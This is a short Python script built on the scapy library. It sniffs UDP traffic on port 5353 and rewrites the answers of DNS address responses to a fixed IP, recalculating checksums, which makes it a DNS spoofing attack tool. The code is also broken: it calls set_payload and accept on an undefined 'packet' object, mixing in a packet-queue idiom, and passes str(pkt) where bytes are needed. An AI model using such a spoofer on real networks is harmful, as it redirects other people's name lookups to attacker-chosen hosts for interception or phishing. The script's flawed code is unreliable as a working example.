from scapy.all import *
import os

redirect_to = '1.1.1.1'
interface = 'tun0'

def callback(pkt):

  pkt.show()
  
  if (pkt.haslayer(DNSRR) and (pkt[DNSRR][0].rdata != redirect_to) and (pkt[DNSQR][0].qtype == 1)): # DNS question record

        pkt.show()
        print('----------------------------------------------')

        pkt[DNSRR][0].rdata = redirect_to

        # Recalculation checksum and length 
        pkt[UDP].chksum = in4_chksum(socket.IPPROTO_UDP, pkt[UDP], raw(pkt[UDP]))
        pkt[UDP].len = len(raw(pkt[UDP]))
        
        pkt[IP].chksum = in4_chksum(socket.IPPROTO_IP, pkt[IP], raw(pkt[IP]))
        pkt[IP].len = len(raw(pkt[IP]))

        # print('----------------------------------------------')
        pkt.show()
                
        packet.set_payload(str(pkt)) #set the packet content to our modified version

        packet.accept() #accept the packet
        # sendp(spoofed_pkt, iface='wlp2s0')
        print ('Sent:', pkt.summary())

sniff(filter='udp and port 5353', iface=interface, store=0, prn=callback)
